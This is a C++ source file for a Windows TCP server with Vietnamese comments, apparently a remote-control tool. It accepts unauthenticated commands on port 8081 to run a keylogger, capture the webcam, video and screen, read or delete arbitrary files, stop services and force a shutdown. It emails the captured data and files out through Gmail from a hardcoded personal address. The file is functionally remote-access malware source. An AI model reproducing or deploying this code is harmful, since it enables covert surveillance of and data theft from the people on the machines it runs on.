#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream> 
#include "utils.h" 
#include<fstream>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Psapi.lib")

#define DEFAULT_PORT "8081"
#define DEFAULT_BUFLEN 512

using namespace std;

class Server {
public:
    Server();
    ~Server();
    void run();

private:
    void handleClientMessage(SOCKET clientSocket, const string& receivedMessage);
    SOCKET listenSocket;
    WSADATA wsaData;
};

Server::Server() {
    // Khởi tạo Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        exit(1);
    }

    struct addrinfo* result = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Giải quyết địa chỉ máy chủ và cổng
    if (getaddrinfo("0.0.0.0", DEFAULT_PORT, &hints, &result) != 0) {
        cerr << "getaddrinfo failed" << endl;
        WSACleanup();
        exit(1);
    }

    // Tạo socket kết nối
    listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (listenSocket == INVALID_SOCKET) {
        cerr << "Socket failed" << endl;
        freeaddrinfo(result);
        WSACleanup();
        exit(1);
    }

    // Ràng buộc socket
    if (bind(listenSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        cerr << "Bind failed" << endl;
        freeaddrinfo(result);
        closesocket(listenSocket);
        WSACleanup();
        exit(1);
    }

    freeaddrinfo(result);

    // Bắt đầu lắng nghe trên socket
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        cerr << "Listen failed" << endl;
        closesocket(listenSocket);
        WSACleanup();
        exit(1);
    }
}

Server::~Server() {
    closesocket(listenSocket);
    WSACleanup();
}

void Server::handleClientMessage(SOCKET clientSocket, const string& receivedMessage) {
    int iResult;
    string sendbuf;
    string refreshtoken;
    if (receivedMessage == "quit") {
        cout << "Quit message received. Shutting down server..." << endl;
        sendbuf = "Server shutting down...";
        send(clientSocket, sendbuf.c_str(), (int)sendbuf.length(), 0);
        return; // Thoát hàm
    }
    else if (receivedMessage == "List apps") {
        wstring result = ListRunningApplications();
        sendbuf = string(result.begin(), result.end());
    }   
    else if (receivedMessage.substr(0, 10) == "List apps+") {//List apps cho mail
        wstring result = ListRunningApplications();
        string body_message = string(result.begin(), result.end());
        string tmp = receivedMessage.substr(10);
        stringstream ss(tmp);
        string mail_request;
        getline(ss, mail_request, '+');
        getline(ss, refreshtoken);
        std::string accessToken = refreshAccessToken(refreshtoken, clientId, clientSecret);
        sendGmail(accessToken, mail_request, "tranminhttnt2005@gmail.com", "Tin nhan phan hoi", body_message);
        sendbuf = "List apps";
    }
    else if (receivedMessage == "List services") {
        wstring result2 = ListServices();
        sendbuf = wstringToString(result2);
    }
    else if (receivedMessage == "List off services") {
        wstring result3 = ListOffServices();
        sendbuf = wstringToString(result3);
    }
    else if (receivedMessage.substr(0, 14) == "List services+") {//List services cho mail
        wstring result2 = ListServices();
        string body_message = string(result2.begin(), result2.end());
        string tmp = receivedMessage.substr(14);
        stringstream ss(tmp);
        string mail_request;
        getline(ss, mail_request, '+');
        getline(ss, refreshtoken);
        std::string accessToken = refreshAccessToken(refreshtoken, clientId, clientSecret);
        sendGmail(accessToken, mail_request, "tranminhttnt2005@gmail.com", "Tin nhan phan hoi", body_message);
        sendbuf = "List services";
    }
    else if (receivedMessage == "Webcam") {
        if (imageCapture()) {
            sendbuf = "Image captured successfully";
        }
        else {
            sendbuf = "Image capture failed";
        }
    }
    else if (receivedMessage == "Video capture") {
        if (videoCapture()) sendbuf = "Quay video thanh cong\n";
        else {
            sendbuf = "Quay video khong thanh cong\n";
        }
    }
    else if (receivedMessage.substr(0, 7) == "Webcam+") {
        if (videoCapture()) {
            string tmp = receivedMessage.substr(7);
            stringstream ss(tmp);
            string mail_request;
            getline(ss, mail_request, '+');
            getline(ss, refreshtoken);
            string filePath = "Clipquaytucamera.mp4";
            std::ifstream file(filePath);
            if (file.good()) {
                std::string accessToken = refreshAccessToken(refreshtoken, clientId, clientSecret);
                size_t lastBackslash = filePath.find_last_of("\\/");
                std::string fullFileName = (lastBackslash != std::string::npos)
                    ? filePath.substr(lastBackslash + 1)
                    : filePath;
                size_t lastDot = fullFileName.find_last_of('.');
                std::string fileName = (lastDot != std::string::npos)
                    ? fullFileName.substr(0, lastDot)
                    : fullFileName;

                std::string extension = (lastDot != std::string::npos)
                    ? fullFileName.substr(lastDot + 1)
                    : "";
                std::string mimeType = getMimeType(extension);
                sendGmailAttachmentsFlexible(accessToken, mail_request, "tranminhttnt2005@gmail.com", "Tin nhan phan hoi", "", filePath, mimeType, fileName);
            }
             sendbuf = "Video captured successfully";
        }
        else {
            sendbuf = "Video capture failed";
        }
    }
    else if (receivedMessage == "Shutdown") {
        system("C:\\WINDOWS\\System32\\shutdown /s /t 0 /f");
        sendbuf = "Shutdown command executed";
    }
    else if (receivedMessage == "Screen shot") {
        CaptureScreen(L"Anhchupmanhinh.png");
        sendbuf = "Screenshot taken successfully";
    }
    else if (receivedMessage.substr(0,12) == "Screen shot+") {
        CaptureScreen(L"Anhchupmanhinh.png");
        string tmp = receivedMessage.substr(12);
        stringstream ss(tmp);
        string mail_request;
        getline(ss, mail_request, '+');
        getline(ss, refreshtoken);
        string filePath = "Anhchupmanhinh.png";
        std::ifstream file(filePath);
        if (file.good()) {
            std::string accessToken = refreshAccessToken(refreshtoken, clientId, clientSecret);
            size_t lastBackslash = filePath.find_last_of("\\/");
            std::string fullFileName = (lastBackslash != std::string::npos)
                ? filePath.substr(lastBackslash + 1)
                : filePath;
            size_t lastDot = fullFileName.find_last_of('.');
            std::string fileName = (lastDot != std::string::npos)
                ? fullFileName.substr(0, lastDot)
                : fullFileName;

            std::string extension = (lastDot != std::string::npos)
                ? fullFileName.substr(lastDot + 1)
                : "";
            std::string mimeType = getMimeType(extension);
            sendGmailAttachmentsFlexible(accessToken, mail_request, "tranminhttnt2005@gmail.com", "Tin nhan phan hoi", "", filePath, mimeType, fileName);
        }
        sendbuf = "Image captured successfully";
    }
    else if (receivedMessage.substr(0, 10) == "Take file+") {
        std::string content = receivedMessage.substr(10);
        std::stringstream ss(content);
        std::string filePath, request_mail;
        std::getline(ss, filePath, '+');  
        std::getline(ss, request_mail, '+');
        std::getline(ss, refreshtoken);
        std::ifstream file(filePath);
        
        if (file.good()) {
            std::string accessToken = refreshAccessToken(refreshtoken, clientId, clientSecret);
            size_t lastBackslash = filePath.find_last_of("\\/");
            std::string fullFileName = (lastBackslash != std::string::npos)
                ? filePath.substr(lastBackslash + 1)
                : filePath;
            size_t lastDot = fullFileName.find_last_of('.');
            std::string fileName = (lastDot != std::string::npos)
                ? fullFileName.substr(0, lastDot)
                : fullFileName;

            std::string extension = (lastDot != std::string::npos)
                ? fullFileName.substr(lastDot + 1)
                : "";

            // Lấy MIME type từ extension
            std::string mimeType = getMimeType(extension);
            // Kết quả
            std::cout << "File name: " << fileName << std::endl;
            std::cout << "MIME type: " << mimeType << std::endl;
            sendGmailAttachmentsFlexible(accessToken, request_mail, "tranminhttnt2005@gmail.com", "Tin nhan phan hoi", "", filePath, mimeType, fileName);
            sendbuf = "Send file successfully";
        }
        else {
            sendbuf = "File not found";
        }
    }
    else if (receivedMessage.substr(0, 12) == "Delete file+") {
        std::string content = receivedMessage.substr(12);
        std::stringstream ss(content);
        std::string filePath, request_mail;
        std::getline(ss, filePath, '+');
        std::getline(ss, request_mail, '+');
        std::getline(ss, refreshtoken);
        std::string accessToken = refreshAccessToken(refreshtoken, clientId, clientSecret);
        if (deleteFile(filePath) == true) {
            cout << filePath;
            sendGmail(accessToken, request_mail, "tranminhttnt2005@gmail.com", "Tin nhan phan hoi", "Xoa file thanh cong");
            sendbuf = "Delete file successfully";
        }
        else {
            sendGmail(accessToken, request_mail, "tranminhttnt2005@gmail.com", "Tin nhan phan hoi", "Xoa file khong thanh cong");
            sendbuf = "Failed to delete file";
        }
    }
    else if (receivedMessage.substr(0, 7) == "on_app ") {
        string appPath = receivedMessage.substr(7);
        wstring wAppPath = wstring(appPath.begin(), appPath.end());
        if (startApplication(wAppPath)) {
            sendbuf = "Application started successfully";
        }
        else {
            sendbuf = "Failed to start application";
        }
    }
    else if (receivedMessage.substr(0, 8) == "off_app ") {
        // Lấy phần PID từ thông điệp
        string pidStr = receivedMessage.substr(8); // Bỏ qua "off_app "
        try {
            DWORD pid = std::stoul(pidStr); // Chuyển đổi PID từ string sang DWORD

            // Gọi hàm stopApplication với PID
            if (stopApplicationByPID(pid)) {
                sendbuf = "Application stopped successfully";
            }
            else {
                sendbuf = "Failed to stop application";
            }
        }
        catch (const std::exception& e) {
            sendbuf = "Invalid PID format: " + pidStr;
        }
    }
    else if (receivedMessage.substr(0, 13) == "stop_service ") {
        // Lấy tên service từ thông điệp
        string serviceName = receivedMessage.substr(13); // Bỏ qua "stop_service "

        try {
            // Chuyển đổi tên service từ string sang wstring
            std::wstring wServiceName(serviceName.begin(), serviceName.end());

            // Gọi hàm stopService với tên service
            if (stopService(wServiceName)) {
                sendbuf = "Service '" + serviceName + "' stopped successfully";
            }
            else {
                sendbuf = "Failed to stop service '" + serviceName + "'";
            }
        }
        catch (const std::exception& e) {
            sendbuf = "Error processing service name: " + serviceName;
        }
    }
    else if (receivedMessage.substr(0, 14) == "start_service ") {
        // Lấy tên service từ thông điệp
        string serviceName = receivedMessage.substr(14); // Bỏ qua "stop_service "

        try {
            // Chuyển đổi tên service từ string sang wstring
            std::wstring wServiceName(serviceName.begin(), serviceName.end());

            // Gọi hàm stopService với tên service
            if (startService(wServiceName)) {
                sendbuf = "Service '" + serviceName + "' started successfully";
            }
            else {
                sendbuf = "Failed to start service '" + serviceName + "'";
            }
        }
        catch (const std::exception& e) {
            sendbuf = "Error processing service name: " + serviceName;
        }
    }
    else if (receivedMessage == "keylogger") {
        std::wstring result = StartKeylogger();
        sendbuf = std::string(result.begin(), result.end()) + "\n";
    }
    else if (receivedMessage == "Tree folder") {
        std::wstring directoryPath = L"C:\\Users\\ad\\Downloads"; // Thay "C:\\example" bằng đường dẫn bạn muốn duyệt.
        std::wstring result = TreeFolder(directoryPath);
        int bufferSize = WideCharToMultiByte(CP_UTF8, 0, result.c_str(), -1, NULL, 0, NULL, NULL);
        std::string resultUtf8(bufferSize, 0);
        WideCharToMultiByte(CP_UTF8, 0, result.c_str(), -1, &resultUtf8[0], bufferSize, NULL, NULL);
        sendbuf = resultUtf8 + "\n";
    }

    else if (receivedMessage.substr(0, 12) == "Tree folder+") {
        std::wstring directoryPath = L"C:\\Users\\ad\\Downloads"; // Thay "C:\\example" bằng đường dẫn bạn muốn duyệt.
        std::wstring result = TreeFolder(directoryPath);
        int bufferSize = WideCharToMultiByte(CP_UTF8, 0, result.c_str(), -1, NULL, 0, NULL, NULL);
        std::string resultUtf8(bufferSize, 0);
        WideCharToMultiByte(CP_UTF8, 0, result.c_str(), -1, &resultUtf8[0], bufferSize, NULL, NULL);
        string tmp = receivedMessage.substr(12);
        stringstream ss(tmp);
        string mail_request;
        getline(ss, mail_request, '+');
        getline(ss, refreshtoken);
        std::string accessToken = refreshAccessToken(refreshtoken, clientId, clientSecret);
        sendGmail(accessToken, mail_request , "tranminhttnt2005@gmail.com", "Tin nhan phan hoi", resultUtf8);
        sendbuf = "Tree folder sent successfully";

    }
    else {
        sendbuf = "Error: Unknown command";
    }

    iResult = send(clientSocket, sendbuf.c_str(), (int)sendbuf.length(), 0);
    if (iResult == SOCKET_ERROR) {
        cerr << "Send failed: " << WSAGetLastError() << endl;
        closesocket(clientSocket);
    }
}

void Server::run() {
    cout << "Server is listening for client connections..." << endl;
    SOCKET clientSocket = accept(listenSocket, NULL, NULL);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Accept failed" << endl;
        return;
    }

    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    bool running = true;

    while (running) {
        int iResult = recv(clientSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            string receivedMessage(recvbuf, iResult);
            cout << "Received: " << receivedMessage << endl;
            handleClientMessage(clientSocket, receivedMessage);
            if (receivedMessage == "quit") {
                running = false;
            }
        }
        else if (iResult == SOCKET_ERROR) { 
            cerr << "Receive failed: " << WSAGetLastError() << endl;
            closesocket(clientSocket);
            running = false;
        }
    }

    closesocket(clientSocket);
}

int main() {
    Server server;
    server.run();
    return 0;
}
